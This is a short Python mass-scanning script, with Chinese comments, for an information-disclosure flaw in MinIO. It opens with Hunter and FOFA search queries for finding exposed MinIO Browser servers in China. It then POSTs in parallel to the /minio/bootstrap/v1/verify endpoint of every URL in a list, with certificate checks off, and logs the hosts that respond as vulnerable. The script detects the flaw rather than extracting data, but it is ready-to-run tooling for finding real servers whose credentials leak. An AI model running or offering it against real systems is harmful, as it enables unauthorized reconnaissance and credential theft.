# MinIO 信息泄露漏洞
# 鹰图 web.title="MinIO Browser"
# 鹰图 web.icon=="ea2e6184f7dcb528f6123196f4653607"
# fofa (banner="MinIO" || header="MinIO" || title="MinIO Browser") && country="CN"
import queue
import urllib3
import requests
import time
import threading
from queue import Queue
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan():
    while not q.empty():
        url = q.get()
        urls = url + '/minio/bootstrap/v1/verify'
        try:
            res = requests.post(url=urls,verify=False,timeout=8).text
            if 'MinioPlatform' in res:
                print(url+'|存在漏洞')
                with open('Minio漏洞.txt','a') as f:
                    f.write(url+'\n')
        except:
            pass
if __name__ == '__main__':
    q = queue.Queue()
    with open('urls.txt','r') as f:
        for url in f:
            url = url.strip()
            q.put(url)
        for i in range(20):
            t = threading.Thread(target=scan)
            t.start()
